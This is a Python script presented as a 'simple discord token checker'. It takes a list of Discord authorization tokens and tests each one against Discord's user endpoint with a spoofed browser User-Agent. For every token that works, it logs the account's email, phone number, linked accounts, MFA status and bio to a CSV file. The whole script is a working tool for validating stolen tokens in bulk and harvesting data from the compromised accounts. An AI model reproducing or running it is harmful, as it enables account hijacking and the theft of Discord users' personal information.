import requests, linecache, argparse, sys
parser = argparse.ArgumentParser(description="Simple discord token checker")
parser.add_argument('-o','--ouput', action='store', dest='outputFileName', required=True)
parser.add_argument('-i','--input', action='store', dest='inputFileName', required=True)
args = parser.parse_args()

def main():
    outputFile = str(args.outputFileName)
    inputFile = str(args.inputFileName)
    lineCounter = 0
    fileLength = 0
    hits = 0
    fails = 0
    inFile = open(inputFile, 'r')
    for line in inFile:
        fileLength += 1
    if fileLength < 1:
        print('[!] Cannot use an empty input file')
        exit()
    outFile = open(outputFile, 'a')
    outFile.write('token,username,nickname,email,emailVerified,phone,locale,nsfw,linkedAccounts,mfaStatus,ID,bio'+'\n')
    while lineCounter <= fileLength:
        token = linecache.getline(inputFile, lineCounter).rstrip('\n')
        print(f'Trying {token} ({lineCounter}/{fileLength})')
        response = requests.get("https://discordapp.com/api/users/@me", headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36","Authorization": token})
        responseData = str(response.content.decode('utf-8'))
        if response.status_code == 200:
            print(f"[+] Success {token} >> {args.outputFileName}")
            try:
                identifier = responseData.split('"id": "')[1].split('"')[0] #string not null
                username = responseData.split('"username": "')[1].split('"')[0] #string not null
                discrim = responseData.split('"discriminator": "')[1].split('"')[0] #string not null
                email = responseData.split('"email": "')[1].split('"')[0] #string not null
                verified = responseData.split('"verified": ')[1].split(',')[0] #bool not null
                locale = responseData.split('"locale": "')[1].split('"')[0]#string not null
                nsfw = responseData.split('"nsfw_allowed": ')[1].split(',')[0] #bool not null
                mfaStatus = responseData.split('"mfa_enabled": ')[1].split(',')[0] #bool not null
                bio = responseData.split('"bio": "')[1].split('"')[0] #string can be empty not null
                if bio == '':
                    bio = 'Null'
                try: phone = responseData.split('"phone": "')[1].split('"')[0] #string, can be null
                except IndexError as ierr: phone = 'Null'; pass
                try: nickname = responseData.split('"global_name": "')[1].split('"')[0]#string, can be null
                except IndexError as ierr: nickname = 'Null'; pass
                try: linkedAccounts = responseData.split('"linked_users": ["')[1].split(']')[0]#array can be empty not null
                except IndexError as ierr: linkedAccounts = 'Null'; pass
                #lastactivity = 
                #dmcount = cba to add this ngl
                #friendsCount =
            except IndexError as ierr:
                continue
            print(f"[+] Token: {token} | User: {username}#{discrim} | Nickname: {nickname} | Email: {email} Verified: {verified} | Phone: {phone} | Locale: {locale} | NSFW: {nsfw} | Linked accounts: {linkedAccounts} | MFA: {mfaStatus} | ID: {identifier} | BIO: {bio}")
            outFile.write(f'{token},{username}#{discrim},{nickname},{email},{verified},{phone},{locale},{nsfw},{linkedAccounts},{mfaStatus},{identifier},{bio}\n')            
            hits += 1
        else:
            print(f"[-] Failiure: {token}")
            fails += 1
        clear(1)
        print(f"Hits: {hits} | Fails: {fails} ({lineCounter}/{fileLength})")
        lineCounter += 1

def clear(amount):
    for _ in range(amount):
            sys.stdout.write('\x1b[1A')
            sys.stdout.write('\x1b[2K')

if "__main__" == __name__:
    main()
